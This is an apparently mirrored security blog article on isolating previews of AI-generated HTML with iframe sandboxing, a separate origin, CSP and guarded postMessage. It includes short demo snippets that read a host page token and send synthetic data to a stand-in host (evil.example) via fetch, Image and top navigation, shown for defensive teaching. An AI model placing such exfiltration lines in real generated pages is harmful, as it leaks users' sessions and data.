---
lang: en-US
title: "Building an Isolated Preview for AI-Generated HTML"
description: "Article(s) > Building an Isolated Preview for AI-Generated HTML"
icon: fa-brands fa-css3-alt
category:
  - JavaScript
  - AI
  - Article(s)
tag:
  - blog
  - master.dev
  - js
  - javascript
  - ai
  - artificial-intelligence
head:
  - - meta:
    - property: og:title
      content: "Article(s) > Building an Isolated Preview for AI-Generated HTML"
    - property: og:description
      content: "Building an Isolated Preview for AI-Generated HTML"
    - property: og:url
      content: https://chanhi2000.github.io/bookshelf/blog.master.dev/building-an-isolated-preview-for-ai-generated-html.html
prev: /programming/js/articles/README.md
date: 2026-10-22
isOriginal: false
author:
  - name: Keshav Malik
    url: https://blog.master.dev/author/keshavmalik/
cover: https://blog.master.dev/wp-json/social-image-generator/v1/image/11466
---

# {{ $frontmatter.title }} 관련

```component VPCard
{
  "title": "JavaScript > Article(s)",
  "desc": "Article(s)",
  "link": "/programming/js/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "AI > Article(s)",
  "desc": "Article(s)",
  "link": "/ai/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

[[toc]]

---

<SiteInfo
  name="Building an Isolated Preview for AI-Generated HTML"
  desc="An iframe with srcdoc feels like a safe place to render HTML a model wrote. It isn't. Three tests show how the preview can read your page, escape the frame, and phone home, and four layers of protection close each hole."
  url="https://blog.master.dev/building-an-isolated-preview-for-ai-generated-html/"
  logo="https://master.dev/favicon.ico"
  preview="https://blog.master.dev/wp-json/social-image-generator/v1/image/11466"/>

I owe this article to an uncomfortable moment while writing the last one. I built the demos in [**Testing an iframe’s `postMessage` Handler**](/blog.master.dev/testing-an-iframes-postmessage-handler.md) with AI assistance. I designed the handlers and the test cases, and a model wrote much of the page scaffolding around them.

The first time it handed me a finished page, I pasted the markup into an iframe on my dev host to see it, and then sat there looking at what I had done. Being a Security Engineer, I review AI features for a living. I had just rendered code nobody had read, in a document that could see my session. Nothing bad happened, because the model had generated exactly what I asked for. A mistake like this works every time until it matters.

Every product that lets a model generate UI now needs a preview, whether it is a chat app with an HTML answer, an internal tool that renders a generated report, or a widget builder. The generated page has to render somewhere. The obvious place is an iframe in your own app, sharing your DOM, your storage, and your network the moment you skip a step.

So this is a sequel. [**Last time**](/blog.master.dev/testing-an-iframes-postmessage-handler.md) the iframe was a wall with one sanctioned door, `postMessage`, and we tested the lock. This time the walls themselves are in question. I will build the preview everyone writes first, break it three different ways, and then rebuild it so that the tested protections and their limits are visible.

---

## The Preview Everyone Writes First

A preview feature begins as two lines. The model returns an HTML string, and the page needs to show it.

```js
const html = modelOutput; // whatever the model returned
document.querySelector('#preview').srcdoc = html;
```

Using [<VPIcon icon="fa-brands fa-firefox"/>`srcdoc`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) already feels responsible. The generated markup renders in its own document, its CSS stays inside, and the page around it keeps its layout. Compared to the genuinely reckless version, `innerHTML` straight into your own DOM, it looks like the careful choice. It works on the first try, which readers of the last article will recognize as part of the problem. Nothing about it invites a second look.

Demo 1 is this preview, unmodified. Paste in any markup, press render, and it does what it promises.

<CodePen
  user="anon"
  slug-hash="QwpaVop"
  title="AI HTML Preview Demo 1: The Naive Preview"
  :default-tab="['css','result']"
  :theme="dark"/>

Here is the second look it deserves. The string you just rendered is code, and nobody on your team wrote it. A model produced it from a prompt, and prompts carry whatever the user, or a document the model read, put there.

You would never paste a stranger’s HTML into your app without reading it. A preview feature does exactly that, on every keystroke, forever.

---

## Test #1 Reads the Page Around It

An iframe loaded through `srcdoc` with no `sandbox` attribute runs on the host page’s own origin. Same origin means same everything. The frame can read `parent.document`, reach `parent.localStorage`, and touch cookies the host can see. The browser is behaving correctly here. A document on your origin is allowed to script another document on your origin, and as far as the browser knows, you wrote both.

Demo 2 gives the host page a pretend session token, the kind a real app keeps in storage or prints into the DOM. The generated page then does what a hostile, or just buggy, snippet would do. It reaches up and reads it.

```js
// inside the generated page
const stolen = parent.document.querySelector('#secret').textContent;
// ...and now it has your token
```

<CodePen
  user="anon"
  slug-hash="vExpzPo"
  title="AI HTML Preview Demo 2: The Preview Reads Your Page"
  :default-tab="['css','result']"
  :theme="dark"/>

Render it with no sandbox and the token appears in the log, lifted straight out of the host. Switch on `sandbox="allow-scripts"` and render again. The same read now throws a `SecurityError`, because the sandboxed frame has an [<VPIcon icon="fa-brands fa-firefox"/>opaque origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin) that matches nothing, including yours.

For a resize widget this would be an annoyance and for a preview it is the whole account. A model preview is the one place in your app where untrusted code runs by design, and the blast radius is anything the host document can see.

---

## Test #2 Tries to Leave the Frame

Reading the host is one direction. The other is the frame reaching out past itself, by navigating the top window away, opening a popup, or submitting a form to some endpoint it chose. A sandbox with only `allow-scripts` blocks all three, but these are exactly the permissions people add back without thinking, because a legitimate embed occasionally wants one of them.

Demo 3 renders a generated page with three getaway tests. The checkboxes add the matching sandbox tokens; render, then click each test inside the frame. Ancestor sandbox restrictions and browser policy still apply.

```js
// the generated page, trying every exit
top.location = 'https://evil.example/pwned'; // navigate the whole tab
window.open('https://evil.example', '_blank'); // pop a new window
document.querySelector('form').submit(); // post somewhere
```

<CodePen
  user="anon"
  slug-hash="emvyLoV"
  title="AI HTML Preview Demo 3: The Preview Tries to Escape"
  :default-tab="['css','result']"
  :theme="dark"/>

With a bare `allow-scripts` sandbox, all three actions are blocked, even when an API returns without throwing. Tick `allow-top-navigation` and the frame gains permission to steer the tab, subject to every ancestor’s sandbox and browser navigation rules. Each token is a specific grant. A preview should start with none of them and earn every addition.

Adding `allow-scripts` so the preview runs is the right instinct. The mistake is pasting in `allow-same-origin` or `allow-top-navigation` alongside it because something broke once.

---

## Test #3 Phones Home

Here is the test that surprises people who thought the sandbox was the finish line. A frame with `sandbox="allow-scripts"` cannot read your page and cannot navigate your tab. It can still open the network. `fetch()` runs, an `Image` with a remote `src` fires a request, and either one can carry data out in the URL.

The sandbox governs what the frame can do to your page and your tab. It says nothing about where the frame may send bytes.

```js
// sandboxed, sending synthetic data already present in the preview
fetch('https://evil.example/collect?token=' + encodeURIComponent('synthetic-demo-token'), { mode: 'no-cors' });
new Image().src = 'https://evil.example/pixel.gif?token=' + encodeURIComponent('synthetic-demo-token');
```

What stops these fetch and image requests is a [<VPIcon icon="fa-brands fa-firefox"/>Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) on the preview document, not another sandbox token. A policy of `default-src 'none'` blocks those requests before they leave. It does not stop the frame from navigating itself, so it is not a complete network boundary. It is a separate control, and it has to be added on purpose.

Demo 4 renders a sandboxed preview with a checkbox to add the CSP. Render it, then click Send test requests inside the frame to try fetch and image requests carrying synthetic data to a reserved test host.

With the policy on, enforced `securitypolicyviolation` events identify the fetch and image blocks. With it off, a failed fetch or image error is inconclusive: `evil.example` is not a live collector, and the demo cannot prove delivery to a server.

<CodePen
  user="anon"
  slug-hash="bNqaxyw"
  title="AI HTML Preview Demo 4: The Preview Phones Home"
  :default-tab="['css','result']"
  :theme="dark"/>

So these are two independent controls. The sandbox decides what the frame can touch, and CSP limits the resources it can load. A preview needs both, because each closes a hole the other leaves open.

---

## Four Walls, Added Back One at a Time

The three tests each pointed at a control. Put them together, and the preview has four layers, each closing a specific gap.

### Start the Sandbox From Nothing

The safe baseline is an empty `sandbox=""`, which blocks scripts, forms, popups, top navigation, and same-origin access all at once. Then add back only what the preview genuinely needs. For running generated pages, that is usually `allow-scripts` alone.

```xml
<iframe sandbox="allow-scripts" srcdoc="..."></iframe>
```

### Never Pair `allow-scripts` with `allow-same-origin`

Together, those two tokens let a frame you fill with content from your origin reach through and script the host. A script that can reach the host can remove the `sandbox` attribute from its own iframe.

The frame can remove its sandbox and reload to shed the remaining restrictions. If the frame truly needs same-origin behavior, it should not be holding untrusted content.

### Treat the Opaque Origin as a Feature

A sandboxed frame without `allow-same-origin` gets an opaque origin, and in a `message` event that origin serializes as the string `"null"`.

The last article flagged this in passing, but here it carries the whole design, because every distinct opaque origin reports the same `"null"` and you can never allowlist that string to identify a sender. Identity has to come from `event.source`, the live window reference the browser fills in, which no amount of attacker control can forge.

### Give User Content its Own Origin

CodePen serves rendered results from `cdpn.io` rather than `codepen.io` for exactly this reason. A dedicated throwaway domain means that even a full sandbox escape lands the attacker on an origin that holds nothing worth stealing. No session, no cookies, no other customer’s data.

The sandbox is the cheap control you apply everywhere. A separate origin is the sturdier one for anything high-value.

### Put a CSP on the Preview Document

Deliver it as a trusted `meta` tag before any generated markup inside the `srcdoc`, or as a response header when the preview loads from its own origin. The header form is stronger, since it covers the document before any inline content runs. The meta form is what you have when everything lives in one `srcdoc` string. `srcdoc` also inherits the host’s CSP; a child policy cannot loosen it.

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
```

### Guard the One Channel You Open

A real preview still needs to talk to the parent, most often to report its height. The channel is exactly what the [**previous article**](/blog.master.dev/testing-an-iframes-postmessage-handler.md) is about, and its source and payload checks carry over, but the origin check needs adapting. Check `event.source` against the one `contentWindow` you embedded, validate the payload shape, and clamp the values.

The origin check is the wrinkle, because a sandboxed sender reports `"null"`. Do not special-case that string. Let `event.source` identity carry the check, and reach for a [<VPIcon icon="fa-brands fa-firefox"/>`MessageChannel`](https://developer.mozilla.org/en-US/docs/Web/API/Channel_Messaging_API) when you want a private pipe that no other frame holds a port to.

---

## One Preview Against Everything

The hardened preview has `sandbox="allow-scripts"`, a `default-src 'none'` CSP with inline scripts and styles allowed, and an adapted `postMessage` handler. Demo 5 points the earlier attacks at it and shows the verdicts in a live table. It uses sandboxed `srcdoc`; a separately hosted preview origin remains a deployment recommendation.

<CodePen
  user="anon"
  slug-hash="zxZpJQL"
  title="AI HTML Preview Demo 5: The Hardened Preview, Tested"
  :default-tab="['css','result']"
  :theme="dark"/>

| Attack | Expected outcome |
| --- | --- |
| Read the host DOM or `localStorage` | Blocked (the opaque origin throws a `SecurityError`) |
| Navigate the top window away | Blocked (no `allow-top-navigation` granted) |
| fetch or beacon a token out | Blocked (CSP refuses the request) |
| Forged resize message, wrong shape | Rejected (the handler requires a finite number) |
| Valid resize message | Accepted (clamped into the allowed range) |

The last two rows are the ones that matter most, because a preview that blocks everything is easy to build and useless to ship. This one still does its one real job: accepting a resize from the frame it embedded, while rejecting malformed or wrong-source messages and failed fetch/image requests with a reason you can read in the log. The frame can still navigate itself; that test shows a limitation.

---

## How I Ship This in Practice

When I build one of these for real, the order is always the same, and it deliberately reverses how the naive version grows.

1. Start with an empty sandbox and add exactly one token, `allow-scripts`, with a comment saying why. Any further token has to justify itself the same way.
2. Serve the preview from a throwaway origin whenever the infrastructure allows it, so a sandbox escape lands somewhere empty.
3. Apply a `default-src 'none'` CSP even though the frame is sandboxed, because the two controls block different things and the overlap is not redundancy.
4. Guard every message channel with the `event.source` and payload checks from the last article, and never allowlist the `"null"` origin string.

I have shipped a preview that allowed more than this, and the trade-off is worth naming. One tool needed the generated page to load images from a known CDN, so the CSP gained an `img-src` entry for `https://that-cdn.example`.

The `img-src` entry genuinely widened the hole, since an image request can still carry a few bytes of stolen data in its path, and I took that trade knowingly because the feature was worthless without images and the CDN was one we controlled.

You do not have to reach the strictest possible policy on every preview you ship, but every loosening should be a decision you can name and defend, the way I can name that one, rather than a token somebody pasted in to make an error go away.

---

## Where the Demos Live

All five demos run the generated page in a real iframe, using `srcdoc` rather than the two-port setup in the [postMessage repo (<VPIcon icon="iconfont icon-github"/>`theinfosecguy/postmessage-demos`)](https://github.com/theinfosecguy/postmessage-demos), so the host and the preview are genuinely different documents rather than a staged mock.

To rerun the previous article’s demos locally, clone [the repo (<VPIcon icon="iconfont icon-github"/>`theinfosecguy/postmessage-demos`)](https://github.com/theinfosecguy/postmessage-demos), serve it on two ports, and open the demo pages. Two localhost ports count as two origins, which is the whole trick. `file://` pages will not reproduce it. For this article’s demos, copy each Pen’s HTML, CSS, and JavaScript into a page served over HTTP. The same pleasing recursion applies as last time. You are reading this on a page that embeds these Pens in iframes and previews code, which is exactly the situation the article is about.

```component VPCard
{
  "title": "AI Amplifies Everything: A Team Lead’s Guide to AI-Assisted Development",
  "desc": "While AI for codegen is manageable, integrating AI into team workflows presents more challenges, such as maintaining quality long term and managing technical debt.",
  "link": "/blog.master.dev/ai-amplifies-everything-a-team-leads-guide-to-ai-assisted-development.md",
  "logo": "https://blog.master.dev/favicon.ico",
  "background": "rgba(188,75,52,0.2)"
}
```

```component VPCard
{
  "title": "Having Fun with Vercel’s AI SDK and AI Gateway",
  "desc": "The why and how to get it installed and use it with different models, then actually build something. Plus a little Zod type safety for good measure.",
  "link": "/blog.master.dev/having-fun-with-vercels-ai-sdk-and-ai-gateway.md",
  "logo": "https://blog.master.dev/favicon.ico",
  "background": "rgba(188,75,52,0.2)"
}
```

```component VPCard
{
  "title": "AI-Assisted Coding: A Practical Guide for Software Engineers",
  "desc": "Let's acknowledge that gap in AI-generated code between code that works and code that is production-ready. It's you.",
  "link": "/blog.master.dev/ai-assisted-coding-a-practical-guide-for-software-engineers.md",
  "logo": "https://blog.master.dev/favicon.ico",
  "background": "rgba(188,75,52,0.2)"
}
```

<!-- TODO: add ARTICLE CARD -->
```component VPCard
{
  "title": "Building an Isolated Preview for AI-Generated HTML",
  "desc": "An iframe with srcdoc feels like a safe place to render HTML a model wrote. It isn't. Three tests show how the preview can read your page, escape the frame, and phone home, and four layers of protection close each hole.",
  "link": "https://chanhi2000.github.io/bookshelf/blog.master.dev/building-an-isolated-preview-for-ai-generated-html.html",
  "logo": "https://master.dev/favicon.ico",
  "background": "rgba(188,75,52,0.2)"
}
```
